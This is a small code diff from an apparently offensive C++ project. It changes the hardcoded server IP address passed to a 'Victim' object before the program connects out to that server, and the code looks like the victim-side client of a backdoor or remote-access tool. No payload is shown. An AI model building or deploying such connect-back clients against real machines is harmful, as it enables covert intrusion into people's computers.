@@ -1,7 +1,7 @@
 #include "Victim.h"
 
 int main() {
-	Victim* victim = new Victim("3.22.15.135");
+	Victim* victim = new Victim("3.129.187.220");
 
 	if (victim->connectToServer() != 0) {
 		return -1;
